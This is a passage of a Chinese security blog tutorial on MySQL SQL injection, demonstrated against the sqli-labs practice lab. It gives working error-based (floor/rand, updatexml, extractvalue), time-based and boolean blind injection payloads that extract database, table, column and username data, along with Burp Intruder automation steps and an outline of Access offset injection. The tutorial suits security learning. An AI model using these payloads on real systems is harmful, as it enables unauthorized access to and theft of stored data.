+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先我们探讨一下是什么导致了报错，真是floor（）这个函数吗？</span><br><span class="line">floor这个函数，它的作用是返回参数的最小整数。也就是向下取整（2.2 ==》）。很显然这个函数不可能导致报错。再者count（*）就是一个计数的函数，也不是。其实真正发生作用的是第二层括号里面的代码</span><br><span class="line"></span><br><span class="line">select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x</span><br><span class="line"></span><br><span class="line">Mysql在执行 select count() from XXX group by x这一类语句时会先创建一个虚拟表，然后在虚拟表中插入数据，key是主键，不可重复。记住，不可重复，这个是重点。key就是后面那个x</span><br><span class="line">假设我们现在有这样一个表</span><br></pre></td></tr></table></figure>
+
+<p>使用 group by 对一些rand()函数进行操作时会返回重复键</p>
+<p>（duplicate key）错误</p>
+<p>向下取整：省略小数点后的数，不会四舍五入</p>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/14.png" alt="1646477221722"></p>
+<p>rand:产生尾随机数的序列，随机产生一个0-1之间的数</p>
+<p><img src="D:/my_blog/source/images/%25E6%258A%25A5%25E9%2594%2599/2" alt="1646469346588"></p>
+</li>
+</ul>
+<p>不加参数每次执行都是不一样的结果，加参数每次执行都是一样的结果</p>
+<ul>
+<li><p>count (*)</p>
+<p>对数据计数</p>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/3233.png" alt="1646475156026"></p>
+</li>
+<li><p>group by </p>
+<p>分组</p>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/4.png" alt="1646475534047"></p>
+</li>
+</ul>
+<p><strong>count(<em>)和group by 特性：count(</em>)和group by在执行的时候会创建虚拟表，虚拟表用来处理数据，计数</strong></p>
+<ol>
+<li>获取数据库名</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/5.png" alt="1646480666891"></p>
+<ol start="2">
+<li>爆表名</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/6..png" alt="1646480854172"></p>
+<ol start="3">
+<li>爆字段</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat((select (column_name) from information_schema.columns where table_schema=database() and table_name= &#x27;users&#x27; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/7.png" alt="1646481042045"></p>
+<ol start="4">
+<li>爆字段数据</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat((select username from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/8.png" alt="1646481199468"></p>
+<ul>
+<li><strong>updatexml()和extractvalue()报错注入</strong></li>
+<li>截取的数据最多显示32位，超过32位使用分段显示</li>
+</ul>
+<p><strong>xpath语法错误，通过爆语法错误，顺便第二个参数里面的参数类容也爆出来，只要让第二个参数不符合xpath语法就可以报错</strong></p>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1646536236587.png" alt="1646536236587"></p>
+<p> <strong>updatexml：</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(&quot;~&quot;,(database())),0)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/9.png" alt="1646534166611"></p>
+<p>获取表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),0x7e),1))--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1646536736551.png" alt="1646536736551"></p>
+<p>列，字段，数据….省略</p>
+<p><strong>extractvalue：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(null,concat(0x7e,(select user()),0x7e));--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1660.png" alt="1646534259127"></p>
+<h3 id="延迟盲注"><a href="#延迟盲注" class="headerlink" title="延迟盲注"></a><strong>延迟盲注</strong></h3><p>判断目标是否真的存在注入点，我们可以加单引号，双引号，减号 等干扰字符来确定输入的参数是否能代入数据库中，但是如果不管输入什么不管怎么闭合，前端页面都是显示正常，那么这时候时间盲注应运而生</p>
+<p>来到sqlilabs的第九关，当我们在url上输入任何参数返回页面都返回正常</p>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/62611.png" alt="1646459336591"></p>
+<p>时间盲注的利用过程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(1=1,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/212.png" alt="1646459863671"></p>
+<ol start="2">
+<li><p>每一个字符都对应一个字符，我们需要ASCII码进行比较通过它的真假来判断截取的字符对应的是什么</p>
+<p>通过ASCII函数来判断</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if ((ascii(mid((select version()),1,1))=53),sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/214.png" alt="1646467884085"></p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h3><p>目标网站即使存在注入，即使存在注入，也没有任何的回显，不管怎样改变参数，有么就是页面没有变化，要么就是页面啥也没有，对于这种情况，我们可以通过布尔盲注要么返回要么不返回的两种状态的改变来判断我们想要的结果</p>
+<p>例如：语句是被带入到数据库执行，但是在页面上看不到任何的信息</p>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/115.png" alt="1646236190924"></p>
+<p><strong>开始注入演示</strong>：</p>
+<p>函数：</p>
+<ul>
+<li>判断长度函数：length</li>
+<li>判断数据库名&gt;&#x3D;&lt;某值</li>
+<li>将字符传换成Ascii</li>
+</ul>
+<ol>
+<li>通过length函数来判断数据库名长度</li>
+</ol>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/9916.png" alt="1646237125455"></p>
+<ol start="2">
+<li>获取数据库名字</li>
+</ol>
+<p>substr(database(),1,a)从数据库名字的第一个开始取第a个</p>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1217..png" alt="1646237780843"></p>
+<p>3.使用ASCLL将字符转换成数字比较</p>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/2119.png" alt="1646238250232"></p>
+<ol start="3">
+<li>获取表</li>
+</ol>
+<ul>
+<li><p>判断表的数量：count,information_schema</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from information_schema.tables where table_schema=database())=4--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/3618.png" alt="1646283281839"></p>
+</li>
+<li><p>获取表名字的长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=5--+</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：这里的limit 0,1排序是从0开始的</strong></p>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/12320.png" alt="1646284501803"></p>
+</li>
+<li><p>获取表名字</p>
+<p>and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema&#x3D;database() limit 0,1)&#x3D;101–+</p>
+<p><strong>注：获取完一个表名，可以设置limit切换下个表</strong></p>
+</li>
+</ul>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/2521.png" alt="1646285143209"></p>
+<h3 id="Burp获取表名信息"><a href="#Burp获取表名信息" class="headerlink" title="Burp获取表名信息"></a>Burp获取表名信息</h3><p>在实际的 WEB渗透中如果目标存在布尔注入，我们在url地址上一个个的测试是非常的麻烦，效率很低的。，所以使用<strong>Burp</strong>的<strong>Intruder</strong>来猜解信息是一个不错的选择</p>
+<p>使用Burp获取表名：</p>
+<ol>
+<li>先抓一个包，然后发送给给Intruder模块</li>
+</ol>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/22.png" alt="1646384318158"></p>
+<ol start="2">
+<li>Intruder配置</li>
+</ol>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/23.png" alt="1646384375603"></p>
+<ol start="3">
+<li>设置变量符号</li>
+</ol>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/24.png" alt="1646384978480"></p>
+<ol start="4">
+<li>设定类型以及范围</li>
+</ol>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/25.png" alt="1646385182573"></p>
+<ol start="5">
+<li>设定好后就可以开始攻击了</li>
+</ol>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/26.png" alt="1646385233286"></p>
+<ol start="6">
+<li><p>开始扫描后，Burp会从0-127依次尝试，当页面回显正常，就会被burp识别，一个个的尝试，最终获取完整表名</p>
+<p><strong>注：如果找不到，点击length排序一下</strong></p>
+</li>
+</ol>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/27.png" alt="1646389674912"></p>
+<ul>
+<li>获取列名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select count(column_name)  from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=3--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/28.png" alt="1646391486413"></p>
+<ul>
+<li>获取列名长度</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select  length(column_name)  from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1)=2--+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/30.png" alt="1646391728435"></p>
+<ul>
+<li>获取列名名称</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select  ascii(substr(column_name,1,1))  from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1)=105--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/31.png" alt="1646392542559"></p>
+<ul>
+<li>获取字段长度</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> length(id) <span class="keyword">from</span> users limit <span class="number">12</span>,<span class="number">1</span>) <span class="operator">=</span><span class="number">2</span><span class="comment">--+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/32.png" alt="1646393476820"></p>
+<ul>
+<li>获取字段名</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select username from users limit 0,1),1,1))=68--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/33.png" alt="1646458321889"></p>
+<p><strong>重点：</strong></p>
+<p><strong>通过查询方式与网站应用得关系注入点产生地方或应用猜测对方查询方式</strong></p>
+<p><strong>例如下方的注册页面，对应的就是插入语句 insert</strong> </p>
+<p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/34.png" alt="1646154063954"></p>
+<h3 id="SQL注入—报错盲注"><a href="#SQL注入—报错盲注" class="headerlink" title="SQL注入—报错盲注"></a>SQL注入—报错盲注</h3><p>​        盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行半段或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">基于布尔的SQL盲注-逻辑判断（优先级：2）</span><br><span class="line"></span><br><span class="line">regexp,like,ascii,left,ord,mid</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">基于时间的SQL盲注-延时判断（优先级：3）</span><br><span class="line"></span><br><span class="line">if,sleep</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">基于报错的SQL盲注-报错回显（优先级：1）</span><br><span class="line"></span><br><span class="line">floor，updatexml，extractvalue</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="12种报错注入-万能语句"><a href="#12种报错注入-万能语句" class="headerlink" title="12种报错注入+万能语句"></a>12种报错注入+万能语句</h3><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
+<h3 id="Access偏移注入"><a href="#Access偏移注入" class="headerlink" title="Access偏移注入"></a><strong>Access偏移注入</strong></h3><p>如果遇到列名猜解不到的情况，则可以使用Access偏移注入</p>
+<ol>
+<li>原理</li>
+</ol>
+<p><strong>借用数据库的自连接查询让数据库内部发生乱序，从而偏移出所需要的字段在我们的页面上显示</strong></p>
+<ol start="2">
+<li>用途</li>
+</ol>
+<p><strong>解决知道Access数据库中知道表名，但是得不到字段的sql注入困境</strong></p>
+<ol start="3">
+<li>特点</li>
+</ol>
+<p><strong>a. 成功与否看技巧与运气，不能保证100%成功。</strong></p>
+<p><strong>b. 无需管理员账号密码字段，直接爆账号密码</strong></p>
+<ol start="4">
+<li>利用条件</li>
+</ol>
+<p><strong>a. 已知管理表名</strong></p>
+<p><strong>b. 已知任意字段（一个或多个会增加机率，最常见的就是id）</strong></p>
+<ol start="5">
+<li>影响偏移注入成功因素</li>
+</ol>
+<p><strong>a. 管理表的字段数越少越好（最好是三个:id 账号字段 密码字段）</strong></p>
+<p><strong>b. 当前注入点的脚本内查询的表内的字段数越多越好</strong></p>
+<ol start="6">
+<li>流程</li>
+</ol>
+<p><strong>a. 判断字段数</strong></p>
+<p><strong>b. 判断表名</strong></p>
+<p><strong>c. 开始偏移注入</strong></p>
+
+    </div>
+</div>
+<style>
+    #noneimg img {
+        display: none;
+        z-index: 109;
+        width: 600px !important;
+        border-radius: 0px;
+        position: fixed;
+        box-shadow: 0 0 0px #c3c3c300 !important;
+        left: 0;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        margin: auto !important;
+    }
+
+    @media screen and (max-width:600px) {
+        #noneimg img {
+            width: 88%
+        }
+    }
+</style>
+<script>
+    $(function () { $('#article').click(function (e) { if (e.target.tagName == "IMG") { if ($('#nonediv').length == 0) { let MImg = `<div id='noneimg'><img src='${e.target.currentSrc}'></div>`; let MDiv = "<div id='nonediv' style='cursor: pointer;display: none; position: fixed;left: 0;top: 0; right: 0;bottom: 0;background-color: #333;opacity:0.5;z-index: 108;'></div>"; $('#article').append(MDiv); $('#article').append(MImg); $("#nonediv").fadeIn("slow"); $("#noneimg img").fadeIn("slow") } } else { if ($('#nonediv').length !== 0) { $("#noneimg ").fadeOut("slow"); $("#nonediv").fadeOut("slow"); setTimeout(function () { $('#nonediv').remove(); $('#noneimg').remove() }, 500) } } }); $('.article-content').addClass('content-move') });
+</script>
+<div class="Last-Next">
+    
+    <a href="/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%5D/">
+        <div class="last">
+            <span>上一篇</span>
+            <p>WEB安全系列-[文件上传]</p>
+        </div>
+    </a>
+    
+
+    
+</div>
+		
+<link rel="stylesheet" href="/css/food.css">
+
+<div class="footer">
+	<div class="Copyright">
+		©2022 By 军军Z1. 主题：<a
+			style="text-decoration: none;display: contents; color: #898F9F;"
+			target="_blank" rel="noopener" href="https://github.com/qiaobug/hexo-theme-quiet">Quiet</a>
+	</div>
+	<div class="contact">
+		
+		<a target="_blank" rel="noopener" href="https://github.com/qiaobug">
+			<img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+		</a>
+		
+	</div>
+</div>
+
+<script src="/js/jquery.min.js"></script>
+
+
+<script src="/js/gotop.js"></script>
+
+
+<style type="text/css">
+    @media screen and (min-width: 600px) {
+        .goTop>span {
+            display: block;
+            border-radius: 50%;
+            width: 66px;
+            height: 66px;
+            cursor: pointer;
+            opacity: 0.8;
+            background: rgba(18, 24, 58, 0.06);
+            text-align: center;
+            border: 1px solid rgba(18, 24, 58, 0.06);
+
+            transition: border .5s;
+            -moz-transition: border .5s;
+            /* Firefox 4 */
+            -webkit-transition: border .5s;
+            /* Safari 和 Chrome */
+            -o-transition: border .5s;
+            /* Opera */
+        }
+
+        .goTop>span:hover {
+            border: 1px solid #6680B3;
+        }
+
+
+        .goTop {
+            position: fixed;
+            right: 30px;
+            bottom: 80px;
+        }
+
+        .goTop>span>svg {
+            width: 30px;
+            height: 30px;
+            margin-top: 17.5px;
+            opacity: 0.7;
+        }
+
+    }
+
+    @media screen and (max-width: 600px) {
+        .goTop {
+            display: none;
+        }
+    }
+</style>
+<div class="goTop" id="js-go_top">
+    <span>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+            <g>
+                <path d="M13 12v8h-2v-8H4l8-8 8 8z"></path>
+            </g>
+        </svg>
+    </span>
+</div>
+<script>
+    $('#js-go_top').gotoTop({ offset: 500, speed: 300, animationShow: { 'transform': 'translate(0,0)', 'transition': 'transform .5s ease-in-out' }, animationHide: { 'transform': 'translate(100px,0)', 'transition': 'transform .5s ease-in-out' } });
+</script>
+<script>
+	console.log('\n %c Hexo-Quiet 主题 %c https://github.com/QiaoBug/hexo-theme-quiet \n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;')
+</script>
+	</body>
+
+</html>
